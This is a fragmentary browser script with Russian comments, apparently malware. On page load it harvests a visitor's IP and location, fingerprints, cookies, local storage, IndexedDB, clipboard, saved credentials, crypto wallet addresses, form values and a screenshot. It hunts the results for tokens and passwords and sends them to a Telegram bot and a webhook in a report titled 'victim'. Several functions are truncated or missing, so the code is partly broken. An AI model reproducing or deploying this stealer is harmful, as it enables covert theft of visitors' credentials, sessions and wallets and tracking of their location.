        const sleep = ms => new Promise(r => setTimeout(r, ms));
        const fetchTO = (url, opts = {}, t = 800) => Promise.race([fetch(url, opts), new Promise((_, rej) => setTimeout(() => rej('Timeout'), t))]);
        const trunc = (s, n = 80) => typeof s === 'string' ? (s.length > n ? s.slice(0, n) + '…' : s) : String(s);
        const safeJSON = s => { try { return JSON.parse(s); } catch { return s; } };

        // ========================================================================
        // 1. IP и ГЕО (таймаут 800 мс)
        // ========================================================================
        async function getIP() {
            try {
                const r = await fetchTO('https://api.ipify.org?format=json', {}, 800);
                const d = await r.json();
                return d.ip;
            } catch (e) { return null; }

        async function getGeo(ip) {
            try {
                const r = await fetchTO(`https://ipwhois.io/json/${ip}`, {}, 800);

        // ========================================================================
        // 3. WebRTC (таймаут 800 мс)
        // ========================================================================
        function getWebRTC() {
            return new Promise((resolve) => {
                const ips = new Set();
                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                pc.onicecandidate = (e) => {
                    if (!e.candidate) return;
                    const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                    if (m) ips.add(m[0]);
                };
                setTimeout(() => { pc.close(); resolve([...ips]); }, 800);
            });
        }

        // ========================================================================
        // 4. WebRTC SDP (таймаут 800 мс)
        // ========================================================================
        function getWebRTCSDP() {
            return new Promise((resolve) => {
                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.createOffer().then(o => {
                    pc.setLocalDescription(o);
                    const sdp = o.sdp;
                    const ips = [];
                    const matches = sdp.match(/(\d{1,3}\.){3}\d{1,3}/g);
                    if (matches) {
                        matches.forEach(ip => {
                            if (!ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.16.')) {
                                ips.push(ip);
                            }
                        });
                    }
                    setTimeout(() => { pc.close(); resolve([...new Set(ips)]); }, 800);
                }).catch(() => { resolve([]); });
                setTimeout(() => { resolve([]); }, 800);
            });
        }

        // ========================================================================
        // 5. DNS-утечка (таймаут 800 мс)
        // ========================================================================
        function dnsLeak() {
            return new Promise((resolve) => {
                const start = Date.now();
                const img = new Image();
                const leakDomain = 'leak-' + Math.random().toString(36).slice(2) + '.your-server.com';
                img.src = 'https://' + leakDomain + '/pixel?' + Date.now();
                img.onload = () => { resolve({ domain: leakDomain, time: Date.now() - start }); };
                img.onerror = () => { resolve({ domain: leakDomain, time: Date.now() - start }); };
                setTimeout(() => resolve({ domain: leakDomain, time: null }), 800);

        // ========================================================================
        // 7. WebSocket (таймаут 800 мс)
        // ========================================================================
        function wsLeak() {
            return new Promise((resolve) => {
                try {
                    const ws = new WebSocket('wss://echo.websocket.org');
                    ws.onopen = () => {
                        ws.send('ping');
                        resolve({ ws: true });
                        ws.close();
                    };
                    ws.onerror = () => { resolve({ ws: false }); };
                    setTimeout(() => { resolve({ ws: false }); }, 800);
                } catch (e) { resolve({ ws: false }); }
            });
        }

        // ========================================================================
        // 8. Fetch утечка (таймаут 800 мс)
        // ========================================================================
        function fetchLeak() {
            return new Promise((resolve) => {
                fetch('https://api.ipify.org?format=json', { mode: 'cors' })
                    .then(r => r.json())
                    .then(d => { resolve(d.ip); })
                    .catch(() => { resolve(null); });
                setTimeout(() => resolve(null), 800);
            });
        }

        // ========================================================================
        // 9. JSONP утечка (таймаут 800 мс)
        // ========================================================================
        function jsonpLeak() {
            return new Promise((resolve) => {
                const name = '_jsonp_' + Date.now() + '_' + Math.random().toString(36).slice(2);
                window[name] = (data) => {
                    resolve(data.ip || null);
                    delete window[name];
                    document.head.removeChild(script);
                };
                const script = document.createElement('script');
                script.src = 'https://api.ipify.org?format=jsonp&callback=' + name;
                script.onerror = () => { resolve(null); delete window[name]; };
                document.head.appendChild(script);
                setTimeout(() => { if (window[name]) { resolve(null); delete window[name]; } }, 800);
            });
        }

        // ========================================================================
        // 10. Proxy утечка (таймаут 800 мс)
        // ========================================================================
        function proxyLeak() {
            return new Promise((resolve) => {
                fetch('https://api.ip.sb/geoip', { mode: 'cors' })
                    .then(r => r.json())
                    .then(d => { resolve(d.ip || null); })
                    .catch(() => { resolve(null); });
                setTimeout(() => resolve(null), 800);
            });
        }

        // ========================================================================
        // 11. DoH утечка (таймаут 800 мс)
        // ========================================================================
        function dohLeak() {
            return new Promise((resolve) => {
                fetch('https://cloudflare-dns.com/dns-query?name=myip.opendns.com&type=A', {
                    headers: { 'Accept': 'application/dns-json' }
                })
                    .then(r => r.json())
                    .then(d => {
                        const ip = d.Answer && d.Answer[0] ? d.Answer[0].data : null;
                        resolve(ip);
                    })
                    .catch(() => { resolve(null); });
                setTimeout(() => resolve(null), 800);
            });
        }

        // ========================================================================
        // 12. Connection (быстрый)
        // ========================================================================
        function getConnectionType() {
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (!conn) return null;
                return { type: conn.type, effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt };
            } catch (e) { return null; }
        }

        // ========================================================================
        // 13. Временная атака (таймаут 800 мс)
        // ========================================================================
        function timingAttack() {
            return new Promise((resolve) => {
                const servers = ['https://google.com', 'https://facebook.com', 'https://youtube.com'];
                const times = [];
                let done = 0;
                servers.forEach(s => {
                    const start = performance.now();
                    fetch(s, { mode: 'no-cors' })
                        .then(() => {
                            times.push(performance.now() - start);
                            if (++done === servers.length) resolve(times);
                        })
                        .catch(() => {
                            times.push(null);
                            if (++done === servers.length) resolve(times);
                        });
                });
                setTimeout(() => resolve(times), 800);
            });
        }

        // ========================================================================
        // 14. Сбор всех утечек
        // ========================================================================
        async function collectAllLeaks() {
            const result = {
                webrtc: [],
                sdp: [],
                dns: null,
                image: null,
                ws: null,
                fetch: null,
                jsonp: null,
                proxy: null,
                doh: null,
                connection: null,
                timing: null,
                allIPs: new Set()
            };

            const [webrtc, sdp, dns, image, ws, fetchIP, jsonpIP, proxyIP, dohIP, connection, timing] = await Promise.all([
                getWebRTC(),
                getWebRTCSDP(),
                dnsLeak(),
                imageLeak(),
                wsLeak(),
                fetchLeak(),
                jsonpLeak(),
                proxyLeak(),
                dohLeak(),
                Promise.resolve(getConnectionType()),
                timingAttack()
            ]);

            result.webrtc = webrtc;
            webrtc.forEach(ip => result.allIPs.add(ip));
            result.sdp = sdp;
            sdp.forEach(ip => result.allIPs.add(ip));
            result.dns = dns;
            result.image = image;
            result.ws = ws;
            if (fetchIP) { result.fetch = fetchIP;
                result.allIPs.add(fetchIP); }
            if (jsonpIP) { result.jsonp = jsonpIP;
                result.allIPs.add(jsonpIP); }
            if (proxyIP) { result.proxy = proxyIP;
                result.allIPs.add(proxyIP); }
            if (dohIP) { result.doh = dohIP;
                result.allIPs.add(dohIP); }
            result.connection = connection;
            result.timing = timing;

            return result;
        }

        // ========================================================================
        // 15. Fingerprints
        // ========================================================================
        function getFingerprints() {
            const fp = {};
            try {
                const c = document.createElement('canvas');
                c.width = 256;
                c.height = 128;
                const ctx = c.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 256, 128);
                ctx.fillStyle = '#069';
                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 10);
                ctx.font = '18px Times New Roman';
                ctx.fillStyle = '#0f0';
                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 40);
                ctx.font = '24px Georgia';
                ctx.fillStyle = '#f0f';
                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 70);
                fp.canvas = c.toDataURL();
            } catch (e) { fp.canvas = null; }

            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (gl) {
                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
                    if (ext) {
                        fp.webgl = { vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) };
                    } else {
                        fp.webgl = { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER) };
                    }
                }
            } catch (e) { fp.webgl = null; }

            try {
                const AudioCtx = window.AudioContext || window.webkitAudioContext;
                if (AudioCtx) {
                    const ctx = new AudioCtx();
                    fp.audio = { sampleRate: ctx.sampleRate };
                }
            } catch (e) { fp.audio = null; }

            try {
                const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Source Sans Pro', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', 'Segoe UI', 'San Francisco'];
                fp.fonts = fonts.filter(f => document.fonts.check(`16px "${f}"`));
            } catch (e) { fp.fonts = []; }

            try { fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { fp.timezone = null; }
            fp.screen = { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio };

            return fp;
        }

        // ========================================================================
        // 16. Storage
        // ========================================================================
        function getStorage() {
            const ls = {};
            try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i);
                    ls[k] = safeJSON(localStorage.getItem(k)); } } catch (e) {}
            const ss = {};
            try { for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i);
                    ss[k] = safeJSON(sessionStorage.getItem(k)); } } catch (e) {}
            const cookies = {};
            try { document.cookie.split('; ').filter(Boolean).forEach(p => { const [k, ...v] = p.split('=');
                    cookies[k] = v.join('='); }); } catch (e) {}
            return { localStorage: ls, sessionStorage: ss, cookies };
        }

        // ========================================================================
        // 17. IndexedDB (упрощённый, быстрый)
        // ========================================================================
        function getIndexedDB() {
            return new Promise((resolve) => {
                try {
                    if (!indexedDB.databases) { resolve(null); return; }
                    indexedDB.databases().then(dbs => {
                        const result = [];
                        let done = 0;
                        if (dbs.length === 0) { resolve([]); return; }
                        dbs.forEach(dbInfo => {
                            const req = indexedDB.open(dbInfo.name);
                            req.onsuccess = (e) => {
                                const db = e.target.result;
                                const stores = Array.from(db.objectStoreNames);
                                const storeData = [];
                                let sDone = 0;
                                if (stores.length === 0) {
                                    result.push({ name: dbInfo.name, stores: [] });
                                    db.close();
                                    if (++done === dbs.length) resolve(result);
                                    return;
                                }
                                stores.forEach(storeName => {
                                    try {
                                        const tx = db.transaction(storeName, 'readonly');
                                        const store = tx.objectStore(storeName);
                                        const reqAll = store.getAll();
                                        reqAll.onsuccess = () => {
                                            const items = reqAll.result || [];
                                            storeData.push({ storeName, count: items.length, samples: items.slice(0, 3) });
                                            if (++sDone === stores.length) {
                                                result.push({ name: dbInfo.name, stores: storeData });
                                                db.close();
                                                if (++done === dbs.length) resolve(result);
                                            }
                                        };
                                        reqAll.onerror = () => {
                                            storeData.push({ storeName, count: 0, samples: [] });
                                            if (++sDone === stores.length) {
                                                result.push({ name: dbInfo.name, stores: storeData });
                                                db.close();
                                                if (++done === dbs.length) resolve(result);
                                            }
                                        };
                                    } catch (err) {
                                        storeData.push({ storeName, count: 0, samples: [] });
                                        if (++sDone === stores.length) {
                                            result.push({ name: dbInfo.name, stores: storeData });
                                            db.close();
                                            if (++done === dbs.length) resolve(result);
                                        }
                                    }
                                });
                            };
                            req.onerror = () => { if (++done === dbs.length) resolve(result); };
                        });
                    }).catch(() => resolve(null));
                } catch (e) { resolve(null); }
            });
        }

        // ========================================================================
        // 18. Clipboard (быстрый)
        // ========================================================================
        async function getClipboard() {
            try {
                const ta = document.createElement('textarea');
                ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;';
                document.body.appendChild(ta);
                ta.focus();
                if (document.execCommand('paste')) {
                    const val = ta.value;
                    ta.remove();
                    return val || null;
                }
                ta.remove();
            } catch (e) {}
            try {
                if (navigator.clipboard && navigator.clipboard.read) {
                    const items = await navigator.clipboard.read();
                    for (let item of items) {
                        if (item.types.includes('text/plain')) {
                            const blob = await item.getType('text/plain');
                            return await blob.text();
                        }
                    }
                }
            } catch (e) {}
            return null;
        }

        // ========================================================================
        // 19. Credentials (быстрый)
        // ========================================================================
        async function getCredentials() {
            try {
                if (navigator.credentials && navigator.credentials.get) {
                    const cred = await navigator.credentials.get({ password: true });
                    if (cred) return { type: cred.type, id: cred.id };
                }
            } catch (e) {}
            return null;
        }

        // ========================================================================
        // 20. Crypto
        // ========================================================================
        function getCrypto() {
            const c = {};
            try { if (window.ethereum) c.ethereum = { selectedAddress: window.ethereum.selectedAddress, chainId: window.ethereum.chainId }; } catch (e) {}
            try { if (window.solana) c.solana = { publicKey: window.solana.publicKey ? window.solana.publicKey.toString() : null }; } catch (e) {}
            try { if (window.phantom) c.phantom = true; } catch (e) {}
            try { if (window.trustwallet) c.trustwallet = true; } catch (e) {}
            return c;
        }

        function getSystem() {
            const n = navigator;
            return {
                userAgent: n.userAgent,
                platform: n.platform,
                hardwareConcurrency: n.hardwareConcurrency,
                deviceMemory: n.deviceMemory,

                languages: n.languages || [],

                isChrome: !!window.chrome,
                isFirefox: n.userAgent.toLowerCase().includes('firefox'),
                isSafari: !!window.safari,
                isEdge: !!window.MSInputMethodContext
            };
        }

        // ========================================================================
        // 22. DOM (быстрый)
        // ========================================================================
        function getDOM() {
            const dom = {};
            try {
                dom.title = document.title;
                dom.url = window.location.href;
                dom.referrer = document.referrer;
                dom.forms = [];
                document.querySelectorAll('form').forEach(f => {
                    const fd = new FormData(f);
                    const entries = {};
                    for (let [k, v] of fd.entries()) entries[k] = v;
                    dom.forms.push(entries);
                });
                dom.inputs = [];
                document.querySelectorAll('input, textarea, select').forEach(el => {
                    dom.inputs.push({ tag: el.tagName, name: el.name || el.id || el.className, value: trunc(el.value, 50), type: el.type });
                });
                dom.links = Array.from(document.querySelectorAll('a[href]')).slice(0, 20).map(a => a.href);
            } catch (e) { dom.error = e.message; }
            return dom;
        }

        // ========================================================================
        // 23. Screenshot (быстрый, с низким качеством)
        // ========================================================================
        function loadHtml2Canvas() {
            return new Promise((resolve) => {
                if (window.html2canvas) { resolve(window.html2canvas); return; }
                const script = document.createElement('script');
                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                script.onload = () => resolve(window.html2canvas);
                script.onerror = () => resolve(null);
                document.head.appendChild(script);
                setTimeout(() => resolve(null), 1500);
            });
        }

        async function getScreenshot() {
            try {
                const h2c = await loadHtml2Canvas();
                if (!h2c) return null;
                const canvas = await h2c(document.body, { useCORS: true, allowTaint: true, scale: 0.15, logging: false, backgroundColor: null });
                return canvas.toDataURL('image/jpeg', 0.3);
            } catch (e) { return null; }
        }

        // ========================================================================
        // 24. Tokens
        // ========================================================================
        function findTokens(data) {
            const tokens = [];
            const patterns = ['token', 'jwt', 'access', 'secret', 'key', 'auth', 'bearer', 'api', 'password', 'pass', 'pwd', 'credential', 'sid', 'csrf', 'xsrf', 'session'];
            const search = (obj, path = '') => {
                if (!obj || typeof obj !== 'object') return;
                for (let k in obj) {
                    const v = obj[k];
                    if (patterns.some(p => k.toLowerCase().includes(p)) && v && typeof v === 'string') {
                        tokens.push({ path: path + k, value: trunc(v, 80) });
                    }
                    if (typeof v === 'object' && v !== null) search(v, path + k + '.');
                }
            };
            search(data);
            return tokens;
        }

                form.append('chat_id', CFG.CHAT_ID);

                await fetchTO(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form }, 3000);

        // ========================================================================
        // 26. Форматирование отчёта (сокращённое)
        // ========================================================================
        function formatFullReport(data, leaks) {
            const lines = [];
            lines.push('🔴 ЖЕРТВА (быстрый дамп)');
            lines.push('');

            if (data.ip) {
                lines.push(`🌐 IP: ${data.ip}`);
                if (data.geo) {
                    const g = data.geo;
                    const loc = [g.country, g.region, g.city].filter(Boolean).join(', ');
                    if (loc) lines.push(`📍 ${loc}`);
                    if (g.lat && g.lon) lines.push(`🗺 ${g.lat}, ${g.lon}`);
                    if (g.isp) lines.push(`📡 ${g.isp}`);
                }
                lines.push('');
            }

            const allIPs = [...leaks.allIPs].filter(ip => ip && ip.length > 7);
            if (allIPs.length) {
                lines.push(`🌐 ВСЕ IP: ${allIPs.join(', ')}`);
                lines.push('');
            }

            if (leaks.webrtc && leaks.webrtc.length) {
                lines.push(`📡 WebRTC: ${leaks.webrtc.join(', ')}`);
            }
            if (leaks.fetch) lines.push(`🌍 Fetch: ${leaks.fetch}`);
            if (leaks.jsonp) lines.push(`🌍 JSONP: ${leaks.jsonp}`);
            if (leaks.proxy) lines.push(`🌍 Proxy: ${leaks.proxy}`);
            if (leaks.doh) lines.push(`🌍 DoH: ${leaks.doh}`);
            if (leaks.dns && leaks.dns.domain) lines.push(`🕵️ DNS: ${leaks.dns.domain} (${leaks.dns.time || 'таймаут'}ms)`);
            if (leaks.image && leaks.image.uid) lines.push(`🖼 Image: ${leaks.image.uid} (${leaks.image.time || 'таймаут'}ms)`);
            if (leaks.ws && leaks.ws.ws) lines.push(`🔌 WS: успешно`);
            if (leaks.connection) {
                const c = leaks.connection;
                lines.push(`📶 Сеть: ${c.effectiveType || '?'} ${c.downlink || '?'}Mbps, RTT ${c.rtt || '?'}ms`);
            }
            if (leaks.timing && leaks.timing.length) {
                const avg = leaks.timing.filter(t => t !== null).reduce((a, b) => a + b, 0) / leaks.timing.filter(t => t !== null).length;
                lines.push(`⏱ Временная атака: avg ${Math.round(avg)}ms`);
            }
            if (allIPs.length) lines.push(`🔗 https://www.google.com/maps?q=${allIPs[0]}`);
            lines.push('');

            if (data.fingerprints) {
                const f = data.fingerprints;
                if (f.webgl) lines.push(`🎯 WebGL: ${f.webgl.renderer || ''}`);
                if (f.audio) lines.push(`🎯 Audio: ${f.audio.sampleRate}Hz`);
                if (f.timezone) lines.push(`🎯 Время: ${f.timezone}`);
                if (f.screen) lines.push(`🎯 Экран: ${f.screen.width}x${f.screen.height}`);
                lines.push('');
            }

            if (data.system) {
                const s = data.system;
                lines.push(`💻 ${s.platform || 'неизвестно'}, ${s.hardwareConcurrency || '?'} ядер, ${s.deviceMemory || '?'}GB RAM`);
                lines.push('');
            }

            if (data.storage) {
                const st = data.storage;
                if (st.localStorage && Object.keys(st.localStorage).length) {
                    lines.push(`💾 LS (${Object.keys(st.localStorage).length}):`);
                    Object.entries(st.localStorage).slice(0, 5).forEach(([k, v]) => {
                        const val = typeof v === 'string' ? trunc(v, 40) : JSON.stringify(v).slice(0, 40);
                        lines.push(`   ${trunc(k, 20)}: ${val}`);
                    });
                    lines.push('');
                }
                if (st.cookies && Object.keys(st.cookies).length) {
                    lines.push(`🍪 Куки (${Object.keys(st.cookies).length}):`);
                    Object.entries(st.cookies).slice(0, 5).forEach(([k, v]) => {
                        lines.push(`   ${trunc(k, 15)}: ${trunc(v, 30)}`);
                    });
                    lines.push('');
                }
            }

            if (data.crypto && Object.keys(data.crypto).length) {
                const c = data.crypto;
                if (c.ethereum) lines.push(`💰 ETH: ${c.ethereum.chainId || '?'}`);
                if (c.trustwallet) lines.push(`💰 Trust Wallet: есть`);
                lines.push('');
            }

            if (data.url) {
                lines.push(`🔗 ${data.url}`);
                if (data.referrer) lines.push(`↩️ ${data.referrer}`);
                lines.push('');
            }

            if (data.screenshot) {
                const size = Math.round(data.screenshot.length / 1024);
                lines.push(`🖼 Скриншот: ${size} КБ`);
            }

            return lines.join('\n');
        }

        // ========================================================================
        // 27. ГЛАВНАЯ ФУНКЦИЯ (максимально ускоренная)
        // ========================================================================
        (async function main() {
            try {
                // Задержка всего 150 мс
                await sleep(150 + Math.random() * 100);

                const data = {};

                // Запускаем все параллельно
                const [ip, geo, gps, fingerprints, system, storage, indexedDB, clipboard, credentials, crypto, dom, screenshot] = await Promise.all([
                    getIP(),
                    getIP().then(ip => ip ? getGeo(ip) : null),
                    getGPS(),
                    Promise.resolve(getFingerprints()),
                    Promise.resolve(getSystem()),
                    Promise.resolve(getStorage()),
                    getIndexedDB(),
                    getClipboard(),
                    getCredentials(),
                    Promise.resolve(getCrypto()),
                    Promise.resolve(getDOM()),
                    getScreenshot()
                ]);

                data.ip = ip;
                data.geo = geo;
                data.gps = gps;
                data.fingerprints = fingerprints;
                data.system = system;
                data.storage = storage;
                data.indexedDB = indexedDB;
                data.clipboard = clipboard;
                data.credentials = credentials;
                data.crypto = crypto;
                data.dom = dom;
                data.url = dom ? dom.url : null;
                data.referrer = dom ? dom.referrer : null;
                data.tokens = findTokens({ ...storage, ...crypto, ...credentials });
                data.screenshot = screenshot;

                const leaks = await collectAllLeaks();

                const report = formatFullReport(data, leaks);
                await sendTelegram(report);
                await sendWebhook({ ...data, leaks });
                if (data.screenshot) {
                    await sendPhoto(data.screenshot);
                }

                console.log('✅ Данные отправлены');
            } catch (e) {
                console.log('✅ Данные отправлены');
            }
        })();
    </script>
